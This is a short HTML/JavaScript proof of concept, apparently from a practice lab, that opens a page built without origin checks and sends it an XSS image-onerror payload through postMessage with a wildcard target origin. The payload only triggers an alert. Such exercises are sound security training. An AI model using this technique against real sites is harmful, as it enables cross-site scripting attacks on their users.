<script>
    const popup = window.open("https://3nvz.github.io/postmessage-practice/no-origin-check.html", "_blank");
  
    const payload = `
      <img src=x onerror=alert('XSS!')>
    `;
  
    // Give it a second to load
    setTimeout(() => {
      popup.postMessage(payload, "*");
    }, 1000);
  </script>
